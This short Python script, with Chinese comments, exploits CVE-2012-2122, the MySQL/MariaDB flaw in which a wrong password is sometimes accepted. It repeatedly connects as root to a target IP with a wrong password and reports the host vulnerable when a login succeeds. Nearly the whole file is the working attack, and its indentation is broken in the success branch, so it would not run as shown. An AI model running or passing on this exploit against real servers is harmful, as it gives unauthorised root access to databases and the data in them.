##当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。
##也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。
##当前系统需安装mysql

import sys
import pymysql

def connect(ip):
    for i in range(1000):
        #print(i)
        try:
            con = pymysql.connect(host=ip, password='test', port=3306, user='root', charset='utf8')
            		     print("存在mysqlCVE_2012_2122漏洞!!")
            	            return True
        except pymysql.err.OperationalError as e:
            error_code = e.args[0]
            error_message = e.args[1]

            if error_code == 1045:
                pass
            else:
                return 0
#connect("192.168.122.219")